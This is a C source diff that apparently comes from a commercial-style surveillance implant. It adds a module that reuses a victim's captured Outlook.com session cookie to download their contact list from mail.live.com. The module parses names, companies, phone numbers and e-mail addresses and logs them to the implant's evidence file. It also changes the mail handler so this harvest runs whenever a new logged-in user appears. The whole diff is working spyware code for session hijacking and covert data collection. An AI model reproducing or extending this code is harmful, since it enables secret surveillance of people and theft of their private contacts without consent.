@@ -21,6 +21,40 @@ extern DWORD max_social_mail_len;
 #define OUTLOOK_OUTBOX "00000000-0000-0000-0000-000000000003"
 #define OUTLOOK_DRAFTS "00000000-0000-0000-0000-000000000004"
 
+#define SKIP_PERIODS(x, y) 		if (!(y = SkipPeriods(x, y))) break;
+
+char *SkipPeriods(DWORD count, char *ptr)
+{
+	for (int i=0; i<count; i++) {
+		if (!(ptr = strchr(ptr, ',')))
+			break;
+		ptr++;
+	}
+	return ptr;
+}
+
+char *ParseField(char *ptr, char *field, DWORD field_len)
+{
+	char *ptr2;
+
+	ZeroMemory(field, field_len);
+	if(*ptr!='\"')
+		return ptr;
+	ptr++;
+	if(*ptr==',')
+		return ptr;
+	ptr2 = strchr(ptr, ',');
+	if (!ptr2)
+		return ptr;
+	ptr2--;
+	*ptr2 = NULL;
+
+	_snprintf_s(field, field_len, _TRUNCATE, "%s", ptr);
+
+	ptr2++;
+	return ptr2;
+}
+
 BOOL ParseDate(char *str_date, FILETIME *ft)
 {
 	SYSTEMTIME st;
@@ -118,18 +152,79 @@ DWORD ParseFolder(char *cookie, char *folder, char *user, DWORD last_tstamp_hi, 
 	return ret_val;
 }
 
+
+DWORD ParseOLContacts(char *cookie, char *user_name)
+{
+	HANDLE hfile;
+	BYTE *r_buffer = NULL;
+	DWORD ret_val;
+	DWORD response_len = 0;
+	char *parser1;
+	char first_name[128];
+	char last_name[128];
+	char ascii_mail[256];
+	char ascii_company[64];
+	char ascii_phone[64];
+	WCHAR company[64];
+	WCHAR phone[64];
+	WCHAR screen_name[256];
+	WCHAR mail_account[256];
+
+	CheckProcessStatus();
+
+	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/mail/GetContacts.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
+	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+		return ret_val;
+
+	CheckProcessStatus();
+	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
+
+	// Crea il propio account
+	_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S", user_name);
+	DumpContact(hfile, CONTACT_SRC_OUTLOOK, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, screen_name, NULL, CONTACTS_MYACCOUNT);
+
+	parser1 = (char *)r_buffer;
+	LOOP {
+		if (!(parser1 = strstr(parser1, "\r\n,")))
+			break;
+		
+		SKIP_PERIODS(1, parser1);
+		parser1 = ParseField(parser1, first_name, sizeof(first_name));
+		SKIP_PERIODS(2, parser1);
+		parser1 = ParseField(parser1, last_name, sizeof(last_name));
+		SKIP_PERIODS(2, parser1);
+		parser1 = ParseField(parser1, ascii_company, sizeof(ascii_company));
+		SKIP_PERIODS(23, parser1);
+		parser1 = ParseField(parser1, ascii_phone, sizeof(ascii_phone));
+		SKIP_PERIODS(18, parser1);
+		parser1 = ParseField(parser1, ascii_mail, sizeof(ascii_mail));
+
+		_snwprintf_s(phone, sizeof(phone)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_phone);
+		_snwprintf_s(company, sizeof(company)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_company);
+		_snwprintf_s(mail_account, sizeof(mail_account)/sizeof(WCHAR), _TRUNCATE, L"%S", ascii_mail);
+		_snwprintf_s(screen_name, sizeof(screen_name)/sizeof(WCHAR), _TRUNCATE, L"%S %S", first_name, last_name);
+
+		DumpContact(hfile, CONTACT_SRC_OUTLOOK, screen_name, mail_account, company, NULL, NULL, NULL, phone, NULL, mail_account, NULL, 0);
+	}
+	Log_CloseFile(hfile);
+
+	SAFE_FREE(r_buffer);
+	return SOCIAL_REQUEST_SUCCESS;
+}
+
 DWORD HandleOutlookMail(char *cookie)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL;
 	DWORD response_len;
 	char curr_user[256];
+	static char last_user_name[256]; 
 	char *ptr, *ptr2;
 	DWORD last_tstamp_hi, last_tstamp_lo;
 
 	CheckProcessStatus();
 
-	if (!bPM_MailCapStarted/* && !bPM_ContactsStarted*/)
+	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
 
 	// Verifica il cookie 
@@ -148,6 +243,17 @@ DWORD HandleOutlookMail(char *cookie)
 	*ptr2 = NULL;
 	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
 	SAFE_FREE(r_buffer);
+
+	if (bPM_ContactsStarted) {	
+		// Se e' diverso dall'ultimo username allora lo logga...
+		if (strcmp(curr_user, last_user_name)) {
+			_snprintf_s(last_user_name, sizeof(last_user_name), _TRUNCATE, "%s", curr_user);		
+			ret_val = ParseOLContacts(cookie, last_user_name);
+		}
+	}
+
+	if (!bPM_MailCapStarted)
+		return ret_val;
 
 	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
 	ParseFolder(cookie, OUTLOOK_OUTBOX, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
